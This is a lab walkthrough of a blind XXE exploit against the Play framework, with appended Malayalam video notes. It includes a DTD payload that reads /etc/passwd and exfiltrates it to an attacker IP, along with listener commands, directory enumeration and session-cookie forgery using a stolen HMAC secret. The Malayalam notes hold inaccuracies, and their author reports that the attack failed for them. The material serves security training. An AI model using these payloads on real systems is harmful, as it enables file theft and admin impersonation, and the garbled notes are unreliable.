## Introduction
-->This exercise covers the exploitation of a XML entities in the Play framework.
-->This course details the exploitation of a XML entity bug in the Play framework. This issue can be used to retrieve arbitrary files and list the content of arbitrary directories.
-->The interresting thing about this bug is that it's completely transparent and can stay (and stayed) unnoticed for a long time. To find this bug in a black-box test, you need to know what you are looking for. If you want to go ahead without following the course, you can find the advisory [here](https://www.playframework.com/security/vulnerability/20130920-XmlExternalEntity)

## The Play Framework
-->The [Play Framework](http://www.playframework.com/) is a web framework that allows developers to quickly build web applications in Java or Scala. The way the code is organised and the URL are mapped are very similar to Ruby-on-Rails.
-->Like Ruby-on-Rails, Play (auto-magically) manages multiple content-types when it receives HTTP requests. Here the application is really simple and has nothing to do with XML, it's just a simple login page. However, since the Play framework automatically parses XML requests, we are able to exploit this bug to read arbitrary files.

## The vulnerability
-->When parsing XML messages, the most important security check is to ensure that XML entities have been disabled. XML entities can be used to tell the XML parser to fetch specific content:
-   From the filesystem.
-   From a web server (HTTP, HTTPs).
-   From a FTP server.
-   ...
-->This can obviously be used by an attacker to retrieve sensitive information on the application (path, passwords, source code,...).
-->The bug impacting Play was a XML entities bug, however this attack is completely blind and no information will be displayed in the response. That's why we will need another way to get information out.

## The exploitation
-->To perform the exploitation, we will need to follow the following steps:
![[bgq8vwb9.bmp]](https://assets.pentesterlab.com/play_xxe/steps.png) 

-->My preferred way of doing this (as it's a blind attack involving multiple steps) is to have 4 terminals next to each other:
-   One to send the initial request (step 1).
-   One to serve the DTD (step 2&3)
-   One to retrieve the information sent by the server (step 5).
-   One for debugging purpose.

## The initial request (step 1)
-->First, we need to send the right HTTP request. The easiest way to do that is to build a tiny script that will connect to the server and send the request. We don't really care about the response but we can still retrieve it. You can perform the same thing with a proxy (preferably with a repeater mode) or manually with netcat. The only thing with netcat is that you will need to manually set the size of the Content-Length header.
-->The initial request needs to be a POST request to ensure that the framework will parse the body of the request. Here the application is pretty simple and we can see that when we try to log in, a POST request is sent:
```http
	POST /login HTTP/1.1
	Host: vulnerable
	User-Agent: PentesterLab 
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Referer: http://vulnerable/login
	Connection: keep-alive
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 27
	 
	username=test&password=test
```
-->We will now need to modify this request to send XML, to do this, we will need:
-   Remove all the unneeded information to make debugging easier.
-   To add the XML message in the body of the request.
-   To change the Content-Type of the request.
```http
	POST /login HTTP/1.1
	Host: vulnerable
	Connection: close
	Content-Type: text/xml
	Content-Length: 36
	 
	<?xml version="1.0"?>
	<foo>bar</foo>
```
-->Finally, we need to add the XML entity payload:
```http
	POST /login HTTP/1.1
	Host: vulnerable
	Connection: close
	Content-Type: text/xml
	Content-Length: 97
	 
	<?xml version="1.0"?>
	<!DOCTYPE foo SYSTEM "http://192.168.159.1:3000/test.dtd">
	<foo>&e1;</foo>
```
-->Where http://192.168.159.1:3000/test.dtd is the location of the DTD.
-->Now that we have a proper HTTP request containing XML, we can send it to the server. If all goes well, the server should respond with a HTTP 400 error as it's unable to retrieve the DTD.

## Serving the DTD (step 2&3)
-->To serve the DTD or any file, you will need a web server. This can be done with any server, however you will need to be able to see if the server tries to retrieve the DTD. In a real scenario, the server may not be able to access your server, so you will need to be able to detect that something is preventing that.
- Run a tiny web server in the foreground. I personally use Webrick and have a Shell alias always ready to start a web server:
```ruby
alias web="ruby -run -ehttpd . -p3000"
```
--> Run a web sever and use tail -f on the log to see every request received.
-->Using the alias above, you should see the following:
```http
	% web
	[2015-03-31 08:19:28] INFO  WEBrick 1.3.1
	[2015-03-31 08:19:28] INFO  ruby 1.9.3 (2012-12-25) [x86_64-darwin12.2.1]
	[2015-03-31 08:19:28] WARN  TCPServer Error: Address already in use - bind(2)
	[2015-03-31 08:19:28] INFO  WEBrick::HTTPServer#start: pid=6028 port=3000
```
-->Once you got this working, make sure you can access the file using a browser and that you can see the requests:
```http
localhost - - [31/Mar/2015:08:20:46 AEDT] "GET /test.dtd HTTP/1.1" 200 153
http://localhost:3000/ -> /test.dtd
```
-->To force the server to send you the content, you will need to use the following DTD:
```xml
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.159.1:3001/BLAH?%p1;'>">
%p2;
```
-->This DTD will force the XML parser to read the content of /etc/passwd and assigned it to the variable p1. Then it will create another variable p2 that contains a link to your malicious server and the value of p1. Then it will print the value of p2 using the %p2. After parsing the DTD will look like:
```xml
<!ENTITY e1 SYSTEM 'http://192.168.159.1:3001/BLAH?[/etc/passwd]'>
```
-->Where [/etc/passwd] is the content of /etc/passwd.
-->If you look back at the initial request that we sent, the body contains a reference to e1: `<foo>&e1;</foo>`
-->Once the server finished processing the DTD, it will resolve the reference to e1 and send the content of /etc/passwd to your server.

## Retrieving the information (step 5)
-->Finally, we need a way to receive the information. You can do that using:
-   netcat -l -p 3001 but you will need to restart the process every time you access the TCP port.
-   socat TCP-LISTEN:3001,reuseaddr,fork - that will not shutdown after the first request but can block after few requests.
-->Now that we have everything working we can retrieve the content of /etc/passwd:![[slkbsu2n.bmp]]

-->In the top right, we can see the final request with the content of /etc/passwd in the URL:
```http
GET /BLAH?root:x:0:0:root:/root:/bin/sh%0Alp:x:7:7:lp:/var/spool/lpd:/bin/sh%0Anobody:x:65534:65534:nobody:/nonexistent:/bin/false%0Atc:x:1001:50:Linux%20User,,,:/home/tc:/bin/sh%0Apentesterlab:x:1000:50:Linux%20User,,,:/home/pentesterlab:/bin/sh%0Aplay:x:100:65534:Linux%20User,,,:/opt/play-2.1.3/xxe/:/bin/false%0Amysql:x:101:65534:Linux%20User,,,:/home/mysql:/bin/false%0A HTTP/1.1
User-Agent: Java/1.7.0-internal
Host: 192.168.159.1:3001
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive	 
```

## Detecting this kind of bugs in the wild
-->In the wild, you can't be sure that the server will be allowed to connect back to you. To detect this bug (and if the server resolves external names), you can use DNS.
-->To do so, you just need to setup a DNS server and monitor its logs. Then you can send the initial request with a XML entity pointing to your domain: http://rand0m123.blah.ptl.io/. If the server is vulnerable to XML entity attacks (and can resolve external DNS name), you will see a DNS query from the vulnerable server.

## Finding the secret URL 
-->Now that everything is working, we will need to find the secret URL. Play framework uses a route file to configure what URL are available and what method should be call. We need to find this file to get access to the secret URL.
-->A common way to find where the application is located is to access the environment. This can be done by trying to read /proc/self/environ. However, this will not work as the parser does not support reading from /proc (probably because it's using DataInputStream).
-->If we go back to the content of /etc/passwd and URL-decode it (for example using Ruby), we can see that a play user exists:
```ruby
	% irb
	1.9.3-p362 :001 > require 'uri'
	 => true
	1.9.3-p362 :002 > puts URI.decode("GET /BLAH?root:x:0:0:root:/root:/bin/sh%0Alp:x:7:7:lp:/var/spool/lpd:/bin/sh%0Anobody:x:65534:65534:nobody:/nonexistent:/bin/false%0Atc:x:1001:50:Linux%20User,,,:/home/tc:/bin/sh%0Apentesterlab:x:1000:50:Linux%20User,,,:/home/pentesterlab:/bin/sh%0Aplay:x:100:65534:Linux%20User,,,:/opt/play-2.1.3/xxe/:/bin/false%0Amysql:x:101:65534:Linux%20User,,,:/home/mysql:/bin/false%0A HTTP/1.1")
	GET /BLAH?root:x:0:0:root:/root:/bin/sh
	lp:x:7:7:lp:/var/spool/lpd:/bin/sh
	nobody:x:65534:65534:nobody:/nonexistent:/bin/false
	tc:x:1001:50:Linux User,,,:/home/tc:/bin/sh
	pentesterlab:x:1000:50:Linux User,,,:/home/pentesterlab:/bin/sh
	play:x:100:65534:Linux User,,,:/opt/play-2.1.3/xxe/:/bin/false
	mysql:x:101:65534:Linux User,,,:/home/mysql:/bin/false
```
-->The home directory of this user is /opt/play-2.1.3/xxe/, there is a good chance that it's where the application is located.
-->Depending on the XML parser, it's also possible to retrieve the listing of a directory. The only way to see if it works is to try. Here we can modify the DTD file to point to /opt/play-2.1.3/xxe/:
```xml
<!ENTITY % p1 SYSTEM "file:///opt/play-2.1.3/xxe/">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.159.1:3001/BLAH?%p1;'>">
%p2;
```
-->And we can see the content of the directory:
```http
GET /BLAH?.gitignore%0A.settings%0Aapp%0Aconf%0Alogs%0Aproject%0Apublic%0AREADME%0ARUNNING_PID%0Atarget%0Atest%0A HTTP/1.1
```
-->Which again, can be decoded to:
```http
GET /BLAH?.gitignore
	.settings
	app
	conf
	logs
	project
	public
	README
	RUNNING_PID
	target
	test
	HTTP/1.1
```
-->Using this, you should be able to find conf/routes. Once you managed to retrieve this routes file, you should be able to access the secret URL.

## Tampering the session
-->Another important file for a Play application is the application.conf, this file contains the secret used to sign the session. This file is also available in the conf directory of the application. Once you have that file, you can easily sign your own session using the secret.
-->First, you need to retrieve the conf/application.conf file using what you saw above. The second step is to forge and sign your session using this secret. To do that we need a better understanding of what is in the session. We can leak the source code of the application to get a better understanding of the logic in place.
-->Based on the conf/routes file, we know that the method controllers.Application.login is called when we submit the login form. By convention, this code is available in app/controllers/Application.java (or .scala if it's a Play application using Scala).
-->Once we retrieved the source code of this controller, we can see that the session management is done by using a variable named user that gets put in the session:
```
	User user = User.findByUsername(username);
	      if (user!=null) {
	          if (user.password.equals(md5(username+":"+password) )) {
	            session("user",username);
	            return redirect("/");
```
-->We will need to forge a Play session that contains the variable user with the value admin.
-->If you looked at our other exercise on Play: [Play Session Injection](https://pentesterlab.com/exercises/play_session_injection), you may be surprised that the internals of Play's sessions have changed since.
-->The previous pattern was:
```
signature-%00name1:value1%00%00name2:value2%00
```
-->In this version of Play, the following is used:
```
signature-name1=value1&name2=value2
```
-->The code used can be found in framework/src/play/src/main/scala/play/api/mvc/Http.scala:
```
	def encode(data: Map[String, String]): String = {
	      val encoded = data.map {
	        case (k, v) => URLEncoder.encode(k, "UTF-8") + "=" +
	URLEncoder.encode(v, "UTF-8")
	      }.mkString("&")
	      if (isSigned)
	        Crypto.sign(encoded) + "-" + encoded
	      else
	        encoded
	    }
```
-->We will now need to add our own variable: user=admin
-->Finally, we can sign the session, the original code looks like:
```
	def sign(message: String, key: Array[Byte]): String = {
	    val mac = Mac.getInstance("HmacSHA1")
	    mac.init(new SecretKeySpec(key, "HmacSHA1"))
	    Codecs.toHexString(mac.doFinal(message.getBytes("utf-8")))
	  }
```
-->In ruby, this can be done using:
```
KEY = "[KEY FOUND IN conf/application.conf]"
	def sign(data)
	  OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, KEY,data)
	end
```
-->The final step is to know the name of the session's cookie. Since it has not been changed in conf/application.conf, the default name is used: PLAY_SESSION
-->After setting this cookie in our browser, we can see that we are now logged in as admin

## Conclusion
-->This exercise explained you how to exploit a XML entity bug in the Play framework. This bug is pretty interesting since it impacts the framework itself as opposed to the way the developers used it.

# Vidoe Explanation
## Video - play xml exploitation
-->so lab open chyuka apol namuk kanan patum mukalil aayi login button.so ath click chyuka apol oru login form kanan patum
-->ivide namuk puthiya account undakan ulla signup form illa.only login form mathrame ullu.so namuk puthiya accoutn undakan patila
-->ivide admin:admin  enn koduth login chyumbol invalid username or passwd enn kanikunu
-->so ee login request ie, /login eduth repeater il iduka.
-->namal ivide xml type exploit aan chyan udheshikunath.so namuk request xml type aaki matam
-->ivide `Content-Type: application/x-www-form-urlencoded`  ennan undavuka so ath mati namuk xml support chyunath aakanam so `Content-Type: text/xml`  enn koudkanam
-->ini post request ile  body il ulla passwd=&username= remove chythit namal avide xml payload kodukanam :
```
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://[our kali ip]:8000/test.dtd">
<foo>&e1;</foo>
```
-->ini namude kalil il oru webserver open aaki idanam athin python or ruby use chyam
->`python3 -m http.server`
-->ipol 8000 port il default aayi webserver run aakum
-->ini namal request send chyuka ie,
```http
POST /login HTTP/1.1
Host: ptl-0aa43b50-71b3b7af.libcurl.so
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Content-Length: 29
Origin: http://ptl-0aa43b50-71b3b7af.libcurl.so
Connection: close
Referer: http://ptl-0aa43b50-71b3b7af.libcurl.so/login
Upgrade-Insecure-Requests: 1

<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://192.168.18.159:8000/test.dtd">
<foo>&e1;</foo>
```
-->so ingane koduthit send chyuka apol namude terminalil test.dtd fetch chyapedum. namude server il /test.dtd enna file illayirunnit polum fetch chyunund.athukondan status 404 file not found enn kanikunath
-->so ivide SSRF aan nadakunath.ith thane oru valiya vulnerability aan ok
-->athayath server namude webserver umayi aan connect chyunath
-->ini namuk test.dtd enna oru file undakam.enit ivide &e1; ennath il enthengilum parse chyan aayi ee namal undakuna test.dtd file il akanm ok :
```dtd
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.159.1:3001/BLAH?%p1;'>">
%p2;
```
-->so ipol namal test.dtd file undaki ini nerthe pole onnukoodi send chyuka.
-->ipol namuk /etc/passwd terminalil kitum means namuk code execution aayi
-->ini ee passwd list analyse chythal kanam last play enna user athinte path /opt/play-2.1.3  enn so ini namal undakiya dtd file il poit file:///etc/passwd mati file:///opt/play-2.1.3/  ennaki file save chyuka enit pine repeater il ninum send chyuka
-->NOTE : namal ipol kodukunath file aayalum athini directory aayalum namuk oru problem illathe retrieve chyth kitum so no worries
-->ipol send chyth kahzinj namal terminalil nokumbol kanam namauk puthiya info terminalil kidakunund.so avide xxe enna oru path kanam.so ini namal enn chyanamenal nerthe pole dtd file il pokuka enit ee path add chyuka ie, file:///opt/play-2.1.3/xxe/ . enit ini repeater il poi send chyuka
-->ipol namuk kore path kitum :
```http
	.gitignore
	.settings
	app
	conf
	logs
	project
	public
	README
	RUNNING_PID
	target
	test
	HTTP/1.1
```
so ithil namal noki oro pathum koduth send chyuka.so ivide /conf/ enna path aan kodukendath.ie, file:///opt/play-2.1.3/xxe/conf/ 
-->ini repaeter il sedn chyumbol namuk pinem korach path kitum athil /routes aan add chyendath ie, file:///opt/play-2.1.3/xxe/conf/routes/
-->ipol namuk enthokeyo terminalil kitum athil oru path secret url enn kidakunundakum.enthengilum randum number/letters aayirikum so athum namal ee dtd file ile path il add chyth send adikumbol namuk ee lab complete aakan ulla key kitum

-->==enthanen areela enik terminalil ith akunen illa oru pravisham terminalil connection kiti pine kitunee illa.athukond lab complete aakna patunila==
